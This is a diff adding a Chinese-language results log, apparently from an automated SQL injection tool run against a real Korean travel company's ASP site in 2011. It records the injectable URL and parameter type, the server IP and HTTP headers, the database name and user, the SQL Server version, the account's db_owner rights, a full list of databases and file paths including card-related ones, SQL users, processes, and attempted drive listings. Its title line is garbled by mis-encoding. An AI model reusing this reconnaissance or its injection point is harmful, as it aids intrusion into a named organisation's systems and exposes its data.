@@ -1,0 +1,109 @@
+■漏洞信息:============================================================
+ ·URL:http://ap.travelbonus.co.kr/TB_Service/Service_center06_2.asp?step=0&pagec=59&page=59&gpage=51&id=36&ref=14&read=1671&numm=23
+ ·页面标题：咯青篮 飘贰喉焊呈胶墨靛客 窃膊!!
+ ·参数:step=0&pagec=59&page=59&gpage=51&id=36&ref=14&read=1671&numm=23
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.182.143.207
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:06:45 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 14215
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAQQCRBDC=KABBBGEABABHFAOCPDHPBKBL; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：WWW_TB_WEB
+- 用户名：TRAVELBONUS
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：STRAVEL
+- 服务名：MSSQLSERVER
+- 系统用户名：TRAVELBONUS
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	e:\mssql\MSSQL\data\master.mdf	
+model	e:\mssql\MSSQL\data\model.mdf	
+msdb	e:\mssql\MSSQL\data\msdbdata.mdf	
+Northwind	e:\mssql\MSSQL\data\northwnd.mdf	
+pubs	e:\mssql\MSSQL\data\pubs.mdf	
+scheduler	E:\MSSQL\MSSQL\Data\scheduler_Data.MDF	
+SH_CARD	e:\MSSQL\MSSQL\data\SH_CARD_Data.MDF	
+SH_CHECKCARD	e:\MSSQL\MSSQL\data\SH_CHECKCARD_Data.MDF	
+SH_SENIOR	e:\MSSQL\MSSQL\data\SH_SENIOR_Data.MDF	
+SharpTravelEng	E:\backup\Database\Daily_Backup\SharpTravelEng_Data.MDF	
+tempdb	e:\mssql\MSSQL\data\tempdb.mdf	
+Toursoft	E:\MSSQL\MSSQL\Data\Toursoft_Data.MDF	
+TRAVELBONUS	e:\MSSQL\MSSQL\data\TRAVELBONUS_Data.MDF	
+Tsweb	E:\MSSQL\MSSQL\Data\Tsweb_Data.MDF	
+WSPANGOET	e:\mssql\MSSQL\data\WSPANGOET_Data.MDF	
+WWW_APACPH2011	e:\mssql\MSSQL\data\WWW_APACPH2011_Data.MDF	
+WWW_HAWAII	e:\mssql\MSSQL\data\WWW_HAWAII_Data.MDF	
+WWW_INCENTIVE	e:\mssql\MSSQL\data\WWW_INCENTIVE_Data.MDF	
+WWW_JEJUAIR	e:\mssql\MSSQL\data\WWW_JEJUAIR_Data.MDF	
+WWW_KB2008	E:\MSSQL\MSSQL\Data\KB_SHARPTRAVEL_Data.MDF	
+WWW_KGEU	e:\mssql\MSSQL\data\WWW_KGEU_Data.MDF	
+WWW_MAKEJEJU	e:\mssql\MSSQL\data\WWW_MAKEJEJU_Data.MDF	
+WWW_NUSKIN2009	e:\mssql\MSSQL\data\WWW_NUSKIN2009_Data.MDF	
+WWW_NUSKIN2010	e:\mssql\MSSQL\data\WWW_NUSKIN2010_Data.MDF	
+WWW_PG	e:\mssql\MSSQL\data\WWW_PG_Data.MDF	
+WWW_SHINHANCORP	e:\mssql\MSSQL\data\WWW_SHINHANCORP_Data.MDF	
+WWW_TB_WEB	e:\mssql\MSSQL\data\WWW_TB_WEB_Data.MDF	
+WWW_TBAPCARD	e:\mssql\MSSQL\data\WWW_TBAPCARD_Data.MDF	
+WWW_TEST	e:\mssql\MSSQL\data\WWW_TEST_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+jmlee	.	┶挊甽?????	04 16 2008  6:48PM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	STRAVEL	8004	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	STRAVEL	8004	AWAITING COMMAND	SYSTEM	
+Internet Information Services	runnable	STRAVEL	6000	UPDATE		
+	background			TASK MANAGER		
+	sleeping			CHECKPOINT SLEEP		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+STRAVEL	SQL Server	SQLOLEDB	STRAVEL		STRAVEL	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
+Dir of C:: 
+一次性获取失败，正在批次获取……
